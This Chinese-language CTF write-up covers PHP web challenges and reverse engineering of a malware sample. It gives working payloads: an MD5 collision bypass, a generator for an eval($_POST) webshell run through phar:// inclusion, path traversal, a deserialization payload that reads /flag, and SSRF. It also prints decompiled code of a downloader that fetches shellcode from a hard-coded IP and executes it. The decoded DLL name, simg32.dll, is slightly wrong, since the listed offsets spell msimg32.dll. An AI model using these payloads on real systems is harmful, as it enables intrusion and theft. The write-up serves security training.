### Writeup

[TOC]

#### 漏洞利用

##### bypass

利用PHP弱类型比较绕过，题目要求a和b不同而md5值相同，只需要找到符合这个条件的数据即可，使用GET传递

```
a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```

is_numeric函数会检查输入是否是数字或数字字符串，只需要插入字母即可绕过，并要求passwd==123456，在弱类型比较下，123456a==123456。num使用科学计数法绕过，只需要传递1e8就会被解析为100000000，使用POST传递

```
passwd=123456a&num=1e8
```

##### php-include

扫描目录找到include.php和upload.php，大概是上传一个webshell并include执行的题目。include.php中提示了参数为file，尝试伪协议读取源代码，?file=php://filter/read=convert.base64-encode/resource=include，可以发现所有被include的文件都会加上.php后缀。

![](https://notes.sjtu.edu.cn/uploads/upload_bcecbeffb85d79c57391c44aec1dd75b.png)

![](https://notes.sjtu.edu.cn/uploads/upload_1a82ddc8494caf603a41a1ee72dee264.png)

![](https://notes.sjtu.edu.cn/uploads/upload_340834646547a742c943540c81cfa2a8.png)

upload.php限制了文件扩展名，只需要编写hell.php（用于生成webshell）进行压缩，再将压缩包后缀改为.jpg，上传后得到路径。

```php
<?php file_put_contents('shell.php','<?php eval($_POST[2])?>'); ?>
```

![](https://notes.sjtu.edu.cn/uploads/upload_3d095a49281d34f98dae5de62f5e0281.png)

使用phar伪协议可以将hell.jpg内的hell.php文件执行，在网站根目录生成webshell，使用蚁剑连接即可得到flag。

```
?file=phar:///uploads/hell.jpg/hell.php
```

![](https://notes.sjtu.edu.cn/uploads/upload_62417c8a1133ed9b09ef5de578f49e08.png)

##### smarty

在主要代码中未对用户输入进行过滤，即使有路径拼接，但可以使用路径穿越漏洞访问其他目录。

```php
if (isset($_GET['page']) && gettype($_GET['page']) === 'string') {
    $file_path = "file://" . getcwd() . "/pages/" . $_GET['page'];
    $smarty->display($file_path);
}
```

只需要输入以下payload即可。

```
?page=../../../../../../../flag
```

##### unserialize

用户可控的$_REQUEST["data"]被反序列化为一个Test对象，func为函数名，p为函数变量，只需要使用不在黑名单中的函数即可对系统文件进行读取，这里使用file_get_contents，生成payload

```
<?php
class Test {
    public $p = "/flag";               // 读取目标
    public $func = "file_get_contents"; // 要调用的函数
    public $disable_fun = [];
}
echo urlencode(serialize(new Test()));
?>
```

使用GET传递参数

```
data=O%3A4%3A"Test"%3A3%3A{s%3A1%3A"p"%3Bs%3A10%3A"%2Fflag"%3Bs%3A4%3A"func"%3Bs%3A17%3A"file_get_contents"%3Bs%3A11%3A"disable_fun"%3Ba%3A1%3A{i%3A0%3Bi%3A123%3B}}
```

##### waitress

服务存在SSRF漏洞， 只需要控制host参数访问一个本地HTTP服务即可得到flag。首先在自己的主机上启动一个Python HTTP服务器监听请求

```
# 启动监听 8000 端口
python3 -m http.server 8000
```

在浏览器访问即可在监听终端中查看flag的内容

```
http://192.168.114.131:11002/getflag?host=1xx.xx.xx.xx:8000
```

#### 漏洞挖掘

##### 代码注入实例分析

恶意样本的主要结构包括两个函数调用

```c
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  sub_4023B0();
  sub_4014D0();
  return 0;
}
```

函数一用于建立远程连接并下载恶意代码

```c
int sub_4023B0()
{
  int v0; // esi
  int v1; // eax
  char buf[8189]; // [esp+Ch] [ebp-2000h] BYREF
  __int16 v4; // [esp+2009h] [ebp-3h]
  char v5; // [esp+200Bh] [ebp-1h]

  sub_401860();
  send(s, ::buf, 10, 0);
  Sleep(0x3E8u);
  v0 = 0;
  memset(buf, 0, sizeof(buf));
  v4 = 0;
  v5 = 0;
  do
  {
    v1 = recv(s, buf, 0x2000, 0);
    if ( v1 <= 0 )
      exit(0);
    v0 += sub_402390(dword_44B5F0 + v0 + 502076, buf, v1);
  }
  while ( v0 != 502076 );
  sub_402390(dword_44B5F0, dword_44B5F0 + 502076, 502076);
  return sub_402390(dword_44B5F0 + 501768, a1013247205, 304);
}
```

`sub_401860()` 很有可能是建立 socket 连接的函数，而后面的代码则实现了功能：

- 每次接收的数据写入到了 `dword_44B5F0 + v0 + 502076` 的地址。

- 累加 `v0` 直到总量达到 `502076`。

- 所以下载的恶意代码大小是 **502076（十进制）字节**。

```c
void sub_401860()
{
  int (__stdcall *v0)(char *, char *, int, int); // eax
  int v1; // eax
  char v2; // cl
  int v3; // edx
  char *v4; // edi
  HMODULE LibraryA; // eax
  HMODULE v6; // esi
  int v7; // eax
  char v8; // cl
  int v9; // edx
  char *v10; // edi
  HMODULE v11; // eax
  int v12; // edi
  FARPROC ProcAddress; // eax
  int i; // eax
  int v15; // esi
  int v16; // [esp+10h] [ebp-240h] BYREF
  LPCSTR lpProcName; // [esp+14h] [ebp-23Ch]
  int v18[5]; // [esp+18h] [ebp-238h]
  struct sockaddr name; // [esp+2Ch] [ebp-224h] BYREF
  char LibFileName[268]; // [esp+3Ch] [ebp-214h] BYREF
  char Buffer[264]; // [esp+148h] [ebp-108h] BYREF

  sub_401830();
  s = socket(2, 1, 6);
  if ( s != -1 )
  {
    while ( 1 )
    {
      v0 = (int (__stdcall *)(char *, char *, int, int))dword_44B5FC;
      v16 = 0;
      if ( dword_44B5FC )
        goto LABEL_22;
      lpProcName = ProcName;
      v18[0] = (int)sub_401AB0;
      v18[1] = (int)aGetnameinfo;
      v18[2] = (int)sub_402170;
      v18[3] = (int)aFreeaddrinfo;
      v18[4] = (int)sub_401A60;
      if ( !dword_44B5F8 )
        break;
LABEL_21:
      v0 = off_447268;
      dword_44B5FC = (int)off_447268;
LABEL_22:
      v15 = v0(a1013247205, 0, 0, (int)&v16);
      WSASetLastError(v15);
      if ( !v15 )
      {
        name = *(struct sockaddr *)*(_DWORD *)(v16 + 24);
        *(_WORD *)name.sa_data = htons(hostshort);
        if ( connect(s, &name, 16) == -1 )
          continue;
      }
      return;
    }
    ...
```

观察发现，函数中调用了 `socket`、`connect` 等 API，传入远程 IP 地址和端口。在汇编代码中我们可以看到静态的IP地址

![](https://notes.sjtu.edu.cn/uploads/upload_04ab405b612d2b7f404e1ace22c515d7.png)

函数二实现了远程代码的注入和执行

```c
DWORD sub_4014D0()
{
  DWORD (__stdcall *v0)(LPVOID); // esi
  HANDLE Thread; // eax

  v0 = (DWORD (__stdcall *)(LPVOID))VirtualAlloc(0, 0x7A93Cu, 0x3000u, 0x40u);
  sub_402390(v0, dword_44B5F0, 502076);
  Thread = CreateThread(0, 0, v0, v0, 0, 0);
  return WaitForSingleObject(Thread, 0xFFFFFFFF);
}
```

主要实现了

- 分配 `0x7A93C` 大小的可执行内存 (`0x3000` = `MEM_COMMIT | MEM_RESERVE`, `0x40` = `PAGE_EXECUTE_READWRITE`)
- 将 `dword_44B5F0` 的数据复制到分配的内存
- 把这段代码作为线程执行（起线程就是执行 shellcode）

综上，上述样本连接的远程主机的IP地址是101.32.47.205，样本中下载的恶意代码的大小是502076字节，远程下载的代码在样本的sub_4014D0()函数中被注入执行。

##### 数据切换

静态分析找到sub_403090()函数，观察可得，这是一个宽字符数组赋值的过程，`LoadLibraryW()` 接受的是一个 `wchar_t *` 指针

```c
word_4BAE92 = 108; // 'l'
word_4BAE86 = 109; // 'm'
word_4BAE84 = 105; // 'i'
word_4BAE88 = 103; // 'g'
word_4BAE90 = 100; // 'd'
word_4BAE96 = 0;   // null terminator
word_4BAE8A = 51;  // '3'
word_4BAE82 = 115; // 's'
word_4BAE94 = 108; // 'l'
word_4BAE8E = 46;  // '.'
word_4BAE8C = 50;  // '2'
LibFileName = 109; // 'm'
```

按地址偏移顺序拼接可得，加载的动态链接库为simg32.dll
